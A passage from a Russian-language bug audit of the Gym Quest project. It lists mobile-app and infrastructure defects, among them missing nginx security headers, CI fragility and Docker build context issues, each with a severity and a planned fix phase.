    return true;  // always blocks Android back
  }
  return false;
});
```

Всегда возвращает `true`, блокируя системную back. Если WebView на корневой странице (auth), `goBack()` ничего не делает, но back всё равно проглочен → юзер не может выйти из приложения back-кнопкой. Нужно `webviewRef.current.canGoBack()` (требует `onNavigationStateChange` отслеживания состояния) — это асинхронно в react-native-webview.

- **Как чиним:** в Phase 3 — добавить `onNavigationStateChange` для отслеживания `canGoBack`, использовать state.

```js
const [canGoBack, setCanGoBack] = useState(false);
// в useEffect handler: if (canGoBack) { goBack(); return true; } else return false;
// WebView: onNavigationStateChange={s => setCanGoBack(s.canGoBack)}
```

- **Входит в бюджет:** yes (Phase 3)

---

### Bug M6: API_URL хардкод без dev-switch

- **Файл:** `mobile/App.js:14`
- **Критичность:** ⚪ nit
- **Категория:** dx
- **Что сломано:** `const API_URL = "https://gymquest.ru"` — в dev-режиме все запросы идут в прод. Нельзя протестировать app против локального API без редактирования файла.
- **Как чиним:** в Phase 3 вынести в `mobile/config.js` с `__DEV__ ? "http://192.168.x.x:3000" : "https://gymquest.ru"`.
- **Входит в бюджет:** yes (Phase 3)

---

### Bug M7: expo-notifications запрашивает permission без сценария использования

- **Файл:** `mobile/App.js:19-25, 27-32, 42`
- **Критичность:** 🟡 medium
- **Категория:** ux / dx
- **Что сломано:** при старте app сразу запрашивает push-permissions (`registerForPush()` в useEffect). Но push-notifications не настроены (FCM отсутствует, `getExpoPushTokenAsync` скорее всего фейлит). Юзер видит модалку "разрешить уведомления" → разрешает/запрещает → ничего не происходит. Лишняя permission-модалка.
- **Как чиним:** в Phase 3 — убрать push полностью (удалить `expo-notifications` из deps) либо оставить handler но не вызывать registerForPush до момента, когда push реально настроят (FCM + google-services.json — отдельная работа вне 10k).
- **Входит в бюджет:** yes (Phase 3, удаление expo-notifications)

---

### Bug M8: QR data не валидируется на формат перед отправкой

- **Файл:** `mobile/App.js:94-101`
- **Критичность:** ⚪ nit
- **Категория:** correctness
- **Что сломано:** любая QR (URL, текст, чужой токен) отправляется в WebView и дальше на сервер. Сервер отклонит (jwt.verify fails), но лишний round-trip + путаница в UI.
- **Как чиним:** в Phase 3 — простая проверка перед инъекцией: `if (!/^[\w-]+\.[\w-]+\.[\w-]+$/.test(data)) { show toast "Не QR-код Gym Quest"; return; }`.
- **Входит в бюджет:** yes (Phase 3)

---

## Infrastructure (docker-compose, Dockerfile, nginx.conf, .github/)

### Bug I1: CI "test" job запускает сервер через eval и ждёт 3 секунды

- **Файл:** `.github/workflows/deploy.yml:34-44`
- **Критичность:** 🟡 medium
- **Категория:** ci / correctness
- **Что сломано:**

```yaml
run: |
  cd server && node -e "
    require('./index.js');
    setTimeout(async () => {
      const r = await fetch('http://localhost:3000/api/health').then(r=>r.json());
      ...
```

Запускает index.js через require (не child process), потом setTimeout 3 секунды чтобы Express успел подняться. Если компиляция дольше — тест упадёт на fetch. Плюс это inline-eval, не отдельный процесс, если index.js падает — нет clean traceback.

- **Как чиним:** в Phase 4 заменить на настоящий smoke (`scripts/smoke.mjs` + ожидание `/api/health` через `wait-on` или аналог). CI будет надёжнее.
- **Входит в бюджет:** yes (Phase 4)

---

### Bug I2: Nginx reference снэпшот рассинхронизирован с VDS

- **Файл:** `nginx.conf` (весь файл — "reference snapshot")
- **Критичность:** 🟡 medium
- **Категория:** dx / consistency
- **Что сломано:** комментарий L3-5 говорит "edit the one on the VDS and reload nginx". Это прямое приглашение к дрифту: файл в репо — не источник правды. Если кто-то правит на VDS, репо не знает. Плюс certbot на VDS добавляет 443-блок, которого нет в репо-файле.
- **Как чиним:** в Phase 4 либо (а) полностью синхронизировать файл с реальной prod-конфигурацией (включая certbot 443), либо (б) перевести nginx в docker compose и управлять конфигом как кодом. Вариант (а) проще.
- **Входит в бюджет:** yes (Phase 4, вариант а)

---

### Bug I3: Security headers только на HTTP, 443-блок без них

- **Файл:** `nginx.conf:29-32`
- **Критичность:** 🟠 high
- **Категория:** security
- **Что сломано:** `add_header X-Frame-Options DENY` и другие — только в серверном 80-блоке. Когда certbot добавил 443 на VDS, эти заголовки в 443-блок НЕ скопировались (ALSO — reference snapshot здесь не включает 443). Таким образом prod HTTPS гоняется БЕЗ security headers.

Также нужны: `Strict-Transport-Security` (HSTS), `Content-Security-Policy`, `Referrer-Policy`.

- **Как чиним:** в Phase 4 обновить nginx-reference + живой конфиг на VDS. Единый блок security headers, включаемый в оба (http и https).
- **Входит в бюджет:** yes (Phase 4)

---

### Bug I4: Dockerfile не имеет HEALTHCHECK

- **Файл:** `Dockerfile`
- **Критичность:** 🟡 medium
- **Категория:** dx / ops
- **Что сломано:** нет `HEALTHCHECK` директивы в app-образе. `docker-compose.yml` имеет только для db. Если app зависнет, `docker compose ps` покажет `Up` и не поднимет перезапуск.
- **Как чиним:** в Phase 4 добавить `HEALTHCHECK CMD wget --spider -q http://localhost:3000/api/health || exit 1` в Dockerfile + `healthcheck:` в compose.
- **Входит в бюджет:** yes (Phase 4)

---

### Bug I5: Dockerfile copies package.json но не .dockerignore → контекст огромный

- **Файл:** `Dockerfile:3-7`, отсутствие `.dockerignore`
- **Критичность:** 🟡 medium
- **Категория:** dx / perf
- **Что сломано:** `COPY server/ ./server/` копирует и `node_modules/`, и `.env`, и любые локальные артефакты. Плюс на хосте в `server/` нет `node_modules/` (он на этом VDS нет), но на разработческой машине — есть 400MB+. Build context блоатится.
- **Как чиним:** в Phase 4 добавить `.dockerignore` с `**/node_modules`, `**/.env`, `*.log`, `coverage`, `dist`, `.github`, `docs`, `ref`.
- **Входит в бюджет:** yes (Phase 4)

---

### Bug I6: .env.example устарел (нет POSTGRES_PASSWORD на корневой уровне)

- **Файл:** `server/.env.example`
- **Критичность:** 🟡 medium
- **Категория:** dx
- **Что сломано:** `server/.env.example` описывает только server-внутренние переменные. Но корневой `docker-compose.yml` ожидает `POSTGRES_DB`, `POSTGRES_USER`, `POSTGRES_PASSWORD` на уровне корня. Нет `.env.example` в корне, разработчик-новичок не поймёт откуда это.
- **Как чиним:** в Phase 4 создать корневой `.env.example` с полным списком переменных для compose. server/.env.example оставить для случая запуска server без docker.
- **Входит в бюджет:** yes (Phase 4)

---

### Bug I7: db-ssl/ bind-mount + нет инструкций как генерить

- **Файл:** `docker-compose.yml:10`, отсутствие docs
- **Критичность:** 🟡 medium
- **Категория:** dx / ops
- **Что сломано:** `./db-ssl:/etc/postgres-ssl:ro` bind-mount. `.gitignore` исключает `db-ssl/`. Разработчик-новичок клонирует репо, не запускается (postgres падает при старте потому что `server.crt` нет). Нет скрипта `scripts/generate-ssl.sh` и нет упоминания в README.
- **Как чиним:** в Phase 4 добавить `scripts/generate-db-ssl.sh` (один вызов openssl) + секцию в README.
- **Входит в бюджет:** yes (Phase 4)

---

### Bug I8: depends_on через condition требует version 3.x compose

- **Файл:** `docker-compose.yml:44-46`
- **Критичность:** ⚪ nit
- **Категория:** dx
- **Что сломано:** компоуз-файл без `version:` директивы. Для `depends_on.condition:` требуется 3.8+. На совсем старых Docker Compose v1 не заработает. На современных v2 (какой у нас сейчас) — работает.

На самом деле отсутствие `version:` в compose v2 — нормально и даже preferred (deprecated в compose v2 spec). Так что всё ОК.

- **Как чиним:** ничего, но задокументировать "requires Docker Compose v2" в README.
- **Входит в бюджет:** no

---

### Bug I9: В CI `JWT_SECRET: test_secret` — слабый секрет в workflow

- **Файл:** `.github/workflows/deploy.yml:32`
- **Критичность:** ⚪ nit
- **Категория:** security / ci
- **Что сломано:** hardcoded `test_secret` в workflow. Для test-инстанса это ок, но если кто-то скопирует pattern в prod — проблема.
- **Как чиним:** ничего критичного. В Phase 4 в новом CI workflow генерировать временный random secret через `openssl rand -hex 32`.
- **Входит в бюджет:** yes (Phase 4, автоматически при новом CI)

---

### Bug I10: Нет никакой CI для lint/typecheck/test (есть только health-ping)

- **Файл:** `.github/workflows/deploy.yml`
- **Критичность:** 🟠 high
- **Категория:** dx / quality gate
- **Что сломано:** существующий workflow только проверяет что сервер поднимается и возвращает health-ok. Сломанный JS-синтаксис (как rW() неделю назад) или regression — CI не ловит. Merge → deploy → prod ломается.
- **Как чиним:** в Phase 4 (cleanup/phase-4-tests-ci) — отдельный workflow `ci.yml` с lint + typecheck + unit + smoke. Блокирует merge если красный.
- **Входит в бюджет:** yes (Phase 4)

---

## Next Steps

После ревью Денисом — каждый найденный баг либо включается в Phase 1-3 имплементации, либо помечается "out of budget" с обоснованием.
